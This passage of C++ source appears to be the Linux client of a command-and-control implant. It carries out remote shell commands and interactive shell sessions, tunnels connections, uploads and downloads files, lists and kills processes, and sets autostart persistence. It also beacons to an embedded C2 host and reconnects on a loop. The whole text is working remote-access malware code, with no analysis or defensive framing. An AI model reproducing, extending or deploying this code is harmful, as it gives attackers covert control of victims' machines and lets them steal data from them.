                    std::thread(tunnel_fwd, tid, cid, sk).detach();
                } else {
                    close(sk);
                }
            }
        }
        return;
    }
    if (tp == "tunnel_data") {
        std::string cid = pl["conn_id"];
        std::string data = pl["data"];
        if (!cid.empty() && !data.empty()) {
            auto raw = b64_dec(data);
            g_tunnel_mu.lock();
            auto it = g_tunnels.find(cid);
            int sk = (it != g_tunnels.end()) ? it->second : -1;
            g_tunnel_mu.unlock();
            if (sk >= 0 && !raw.empty()) write(sk, raw.data(), raw.size());
        }
        return;
    }

    if (tp == "exec" || tp == "shell") {
        result = sh_exec(pl["command"]);
    } else if (tp == "shell_session_create") {
        result = shell_session_create(pl["session_id"]);
        ok = (result.find("Session created successfully") == 0);
    } else if (tp == "shell_session_write") {
        result = shell_session_write(pl["session_id"], pl["input"]);
        ok = result.empty();
    } else if (tp == "shell_session_close") {
        result = shell_session_close(pl["session_id"]);
    } else if (tp == "list_dir") {
        result = list_dir_json(pl["path"]);
    } else if (tp == "list_dir_children") {
        result = list_dir_children_json(pl["path"]);
    } else if (tp == "mkdir") {
        ok = mkdir_p(pl["path"].c_str());
        result = ok ? "mkdir ok" : strerror(errno);
    } else if (tp == "download") {
        std::string path = pl["path"];
        if (path.empty()) {
            ok = false;
            result = "missing path";
        } else if (!pl["offset"].empty()) {
            uint64_t off = strtoull(pl["offset"].c_str(), NULL, 10);
            size_t len = kFileChunkSize;
            if (!pl["length"].empty()) {
                unsigned long long L = strtoull(pl["length"].c_str(), NULL, 10);
                if (L > 0ULL && L <= 16ULL * 1024ULL * 1024ULL) len = (size_t)L;
            }
            int fd = open(path.c_str(), O_RDONLY);
            if (fd < 0) {
                ok = false;
                result = strerror(errno);
            } else {
                if (lseek(fd, (off_t)off, SEEK_SET) < 0) {
                    ok = false;
                    result = strerror(errno);
                    close(fd);
                } else {
                    std::vector<unsigned char> buf(len);
                    ssize_t n = read(fd, buf.data(), len);
                    close(fd);
                    if (n < 0) {
                        ok = false;
                        result = strerror(errno);
                    } else {
                        result = b64_enc(buf.data(), (size_t)n);
                        ok = true;
                    }
                }
            }
        } else {
            result = read_file_b64(path);
            if (result.empty() && access(path.c_str(), R_OK) != 0) {
                ok = false;
                result = std::string("download failed: ") + strerror(errno);
            }
        }
    } else if (tp == "upload") {
        std::string path = pl["path"];
        std::string content = pl["content"];
        if (path.empty()) {
            ok = false;
            result = "missing path";
        } else if (!pl["chunk_index"].empty()) {
            uint64_t idx = strtoull(pl["chunk_index"].c_str(), NULL, 10);
            ok = write_file_chunk(path, content, idx);
            result = ok ? ("write_file_chunk[" + std::to_string((unsigned long long)idx) + "] ok") : strerror(errno);
        } else {
            ok = write_file_full(path, content);
            result = ok ? "write_file ok" : strerror(errno);
        }
    } else if (tp == "process_list") {
        result = process_list_json();
    } else if (tp == "kill_process") {
        int pid = atoi(pl["pid"].c_str());
        if (pid <= 0) {
            ok = false;
            result = "invalid pid";
        } else {
            ok = (kill((pid_t)pid, SIGKILL) == 0);
            if (!ok) result = "kill failed";
        }
    } else if (tp == "screenshot" || tp == "screen_monitor_start" || tp == "screen_monitor_stop") {
        ok = false;
        result = "截图与屏幕监控在 Linux 客户端中未实现";
    } else if (tp == "autostart_set") {
        std::string mode = pl["autostart_mode"];
        char exe[PATH_MAX] = {0};
        ssize_t el = readlink("/proc/self/exe", exe, sizeof(exe) - 1);
        if (el > 0) exe[el] = 0;
        ok = autostart_set_mode(mode, exe, result);
    } else if (tp == "autostart_remove") {
        result = autostart_remove_all();
    } else if (tp == "disconnect") {
        g_running = 0;
        exit(0);
    } else {
        ok = false;
        result = "unknown type: " + tp;
    }

    send_cmd_resp(id, result, ok, reply_tcp);
}

static std::string embed_zstr_field(const char* p, size_t cap) {
    size_t n = 0;
    while (n < cap && p[n]) ++n;
    return std::string(p, n);
}

static std::string embed_tcp_host_raw_linux() {
    return embed_zstr_field(reinterpret_cast<const char*>(g_c2_embed.host), sizeof(g_c2_embed.host));
}

static std::string embed_web_host_raw_linux() {
    return embed_zstr_field(reinterpret_cast<const char*>(g_c2_embed.web_host), sizeof(g_c2_embed.web_host));
}

static bool split_host_port_str(const std::string& ep, std::string& out_h, int& out_p) {
    if (ep.empty()) return false;
    if (ep[0] == '[') {
        size_t br = ep.find(']');
        if (br == std::string::npos || br + 1 >= ep.size() || ep[br + 1] != ':') return false;
        const char* ps = ep.c_str() + br + 2;
        char* eptr = nullptr;
        long pv = strtol(ps, &eptr, 10);
        if (eptr == ps || pv < 1 || pv > 65535) return false;
        out_h = ep.substr(1, br - 1);
        out_p = (int)pv;
        return !out_h.empty();
    }
    size_t pos = ep.rfind(':');
    if (pos == std::string::npos || pos + 1 >= ep.size()) return false;
    for (size_t i = pos + 1; i < ep.size(); ++i) {
        if (ep[i] < '0' || ep[i] > '9') return false;
    }
    int pv = atoi(ep.c_str() + pos + 1);
    if (pv < 1 || pv > 65535) return false;
    out_h = ep.substr(0, pos);
    if (out_h.empty()) return false;
    out_p = pv;
    return true;
}

static void resolve_tcp_dial_linux(std::string& dial_host, int& dial_port) {
    std::string raw = embed_tcp_host_raw_linux();
    if (SERVER_PORT >= 1 && SERVER_PORT <= 65535) {
        std::string h;
        int unused = 0;
        if (split_host_port_str(raw, h, unused)) {
            dial_host = std::move(h);
        } else {
            dial_host = std::move(raw);
        }
        dial_port = SERVER_PORT;
        return;
    }
    std::string h;
    int p = 0;
    if (split_host_port_str(raw, h, p)) {
        dial_host = std::move(h);
        dial_port = p;
        return;
    }
    dial_host = std::move(raw);
    dial_port = SERVER_PORT;
}

static std::string linux_resolve_ws_host(const std::string& wh) {
    std::string h = wh.empty() ? embed_web_host_raw_linux() : wh;
    if (h == "127.0.0.1" || h == "localhost" || h == "::1") {
        std::string fb = embed_web_host_raw_linux();
        std::string fb_host;
        int fb_port = 0;
        if (split_host_port_str(fb, fb_host, fb_port)) {
            if (fb_host != "127.0.0.1" && fb_host != "localhost" && fb_host != "::1") return fb_host;
        } else if (!fb.empty() && fb != "127.0.0.1" && fb != "localhost" && fb != "::1") {
            return fb;
        }
        std::string th = embed_tcp_host_raw_linux();
        std::string thh;
        int tp = 0;
        if (split_host_port_str(th, thh, tp)) return thh;
        return th;
    }
    return h;
}

static void linux_resolve_ws_open_params(const std::string& msg_wh, const std::string& msg_wp, std::string& out_host, int& out_port) {
    std::string wh = msg_wh.empty() ? embed_web_host_raw_linux() : msg_wh;
    int wp = msg_wp.empty() ? 0 : atoi(msg_wp.c_str());
    if (wp < 1 || wp > 65535) {
        std::string h;
        int pp;
        if (split_host_port_str(wh, h, pp)) {
            wh = std::move(h);
            wp = pp;
        } else {
            wp = C2_WEB_PORT;
        }
    }
    if (wp < 1 || wp > 65535) {
        std::string h;
        int pp;
        if (split_host_port_str(embed_web_host_raw_linux(), h, pp)) {
            if (wh == "127.0.0.1" || wh == "localhost" || wh == "::1") wh = std::move(h);
            wp = pp;
        }
    }
    out_host = linux_resolve_ws_host(wh);
    out_port = wp;
    if (out_port <= 0) out_port = C2_WEB_PORT;
    if (out_port <= 0) out_port = 8080;
}

static void *hb_thread(void *) {
    while (g_hb_run.load()) {
        sleep((unsigned)HEARTBEAT_INTERVAL);
        if (!g_hb_run.load()) break;
        g_hb_val++;
        std::map<std::string, std::string> m;
        m["type"] = "heartbeat";
        m["value"] = std::to_string(g_hb_val);
        char cwd[PATH_MAX] = {0};
        if (getcwd(cwd, sizeof(cwd))) m["working_dir"] = cwd;
        if (g_sock >= 0) send_line_sec(g_sock, json_obj(m));
    }
    return NULL;
}

static bool ws_upgrade(const std::string &host, int port, const std::string &tok) {
    int sk = socket(AF_INET, SOCK_STREAM, 0);
    if (sk < 0) return false;
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(port);
    if (inet_pton(AF_INET, host.c_str(), &a.sin_addr) != 1) {
        close(sk);
        return false;
    }
    if (connect(sk, (struct sockaddr *)&a, sizeof(a)) < 0) {
        close(sk);
        return false;
    }
    unsigned char rnd[16];
    RAND_bytes(rnd, 16);
    std::string key = b64_enc(rnd, 16);
    char req[1024];
    snprintf(req, sizeof(req),
             "GET /ws/agent?token=%s HTTP/1.1\r\nHost: %s:%d\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: "
             "%s\r\nSec-WebSocket-Version: 13\r\n\r\n",
             tok.c_str(), host.c_str(), port, key.c_str());
    send(sk, req, strlen(req), 0);
    char buf[4096];
    size_t t = 0;
    while (t < sizeof(buf) - 1) {
        if (recv(sk, buf + t, 1, 0) <= 0) {
            close(sk);
            return false;
        }
        t++;
        if (t >= 4 && buf[t - 4] == '\r' && buf[t - 3] == '\n' && buf[t - 2] == '\r' && buf[t - 1] == '\n') break;
    }
    buf[t] = 0;
    if (strstr(buf, "101") == NULL) {
        close(sk);
        return false;
    }
    g_ws = sk;
    g_use_ws = 1;
    return true;
}

static void ws_loop() {
    while (g_running && g_use_ws && g_ws >= 0) {
        unsigned char h[2];
        if (!recv_exact(g_ws, h, 2)) break;
        unsigned op = h[0] & 0x0f;
        if (op == 8) break;
        uint64_t plen = h[1] & 0x7f;
        bool mask = (h[1] & 0x80) != 0;
        if (plen == 126) {
            unsigned char e[2];
            if (!recv_exact(g_ws, e, 2)) break;
            plen = (e[0] << 8) | e[1];
        } else if (plen == 127) {
            unsigned char e[8];
            if (!recv_exact(g_ws, e, 8)) break;
            plen = 0;
            for (int i = 0; i < 8; i++) plen = (plen << 8) | e[i];
        }
        unsigned char mk[4] = {0};
        if (mask && !recv_exact(g_ws, mk, 4)) break;
        if (plen > 50 * 1024 * 1024) break;
        std::string payload;
        payload.resize((size_t)plen);
        if (plen > 0 && !recv_exact(g_ws, &payload[0], (size_t)plen)) break;
        if (mask) {
            for (size_t i = 0; i < (size_t)plen; i++) payload[i] ^= mk[i % 4];
        }
        std::map<std::string, std::string> msg;
        if (parse_flat_json(payload, msg)) {
            std::string t = msg["type"];
            std::string id = msg["id"];
            if (t == "list_dir" || t == "list_dir_children")
                handle_cmd(id, t, msg, false);
            else
                std::thread(handle_cmd, id, t, msg, false).detach();
        }
    }
    g_use_ws = 0;
    if (g_ws >= 0) close(g_ws);
    g_ws = -1;
}

static void tcp_loop() {
    while (g_running) {
        std::string line = recv_line_sec(g_sock, 60000);
        if (line.empty()) {
            if (!g_use_ws) continue;
            continue;
        }
        std::map<std::string, std::string> msg;
        if (!parse_flat_json(line, msg)) continue;
        if (msg["type"] == "signal" && msg["action"] == "open_ws") {
            std::string w_host;
            int w_port = 0;
            linux_resolve_ws_open_params(msg["web_host"], msg["web_port"], w_host, w_port);
            std::string tok = msg["token"];
            std::thread([w_host, w_port, tok]() {
                if (ws_upgrade(w_host, w_port, tok)) ws_loop();
            }).detach();
            continue;
        }
        if (g_use_ws) continue;
        std::string t = msg["type"], id = msg["id"];
        std::thread(handle_cmd, id, t, msg, true).detach();
    }
}

int main() {
    signal(SIGPIPE, SIG_IGN);
    OPENSSL_init_crypto(OPENSSL_INIT_LOAD_CRYPTO_STRINGS | OPENSSL_INIT_ADD_ALL_CIPHERS, NULL);
    int boot_once = 0;
    while (g_running) {
        if (!boot_once && !diag_quiet()) {
            std::string dh;
            int dp = 0;
            resolve_tcp_dial_linux(dh, dp);
            fprintf(stderr, "[c2-agent] boot tcp=%s:%d web=%s:%d enc=%d (C2_AGENT_QUIET=1 silences info)\n", dh.c_str(), dp,
                    C2_WEB_HOST_STR, C2_WEB_PORT, use_enc() ? 1 : 0);
            boot_once = 1;
        }
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in a;
        memset(&a, 0, sizeof(a));
        a.sin_family = AF_INET;
        std::string dial_host;
        int dial_port = 0;
        resolve_tcp_dial_linux(dial_host, dial_port);
        a.sin_port = htons((uint16_t)dial_port);
        if (inet_pton(AF_INET, dial_host.c_str(), &a.sin_addr) != 1) {
            diag_err("invalid TCP dial host in binary: %s", dial_host.c_str());
            close(g_sock);
            g_sock = -1;
            sleep(30);
            continue;
        }
        diag_info("dial tcp %s:%d ...", dial_host.c_str(), dial_port);
        if (connect(g_sock, (struct sockaddr *)&a, sizeof(a)) < 0) {
            diag_err("tcp connect %s:%d failed: %s — check listener started, firewall, ExternalAddr reachable (retry 30s)", dial_host.c_str(), dial_port,
                     strerror(errno));
            close(g_sock);
            g_sock = -1;
            sleep(30);
            continue;
        }
        diag_info("tcp ok, sending register...");
        std::map<std::string, std::string> reg;
        collect_register(reg);
        if (!send_line_sec(g_sock, json_obj(reg))) {
            diag_err("send register failed (encrypt or send)");
            close(g_sock);
            g_sock = -1;
            sleep(30);
            continue;
        }
        std::string resp = recv_line_sec(g_sock, 10000);
        if (resp.empty()) {
            diag_err("read register ack timeout/closed — if enc on, VKey/Salt must match listener");
            close(g_sock);
            g_sock = -1;
            sleep(30);
            continue;
        }
        if (resp.find("registered") == std::string::npos) {
            char prev[260] = {0};
            size_t n = resp.size() < sizeof(prev) - 1 ? resp.size() : sizeof(prev) - 2;
            memcpy(prev, resp.data(), n);
            diag_err("register rejected (no 'registered' in reply): %s", prev);
            diag_err("hint: use same listener as payload; tcp port is C2 not web panel unless they match");
            close(g_sock);
            g_sock = -1;
            sleep(30);
            continue;
        }
        diag_info("registered OK, session loop");
        g_hb_run.store(1);
        pthread_t hb;
        pthread_create(&hb, NULL, hb_thread, NULL);
        tcp_loop();
        g_hb_run.store(0);
        pthread_join(hb, NULL);
        diag_info("session ended, reconnect in 30s");
        close(g_sock);
        g_sock = -1;
        sleep(30);
    }
    return 0;
}
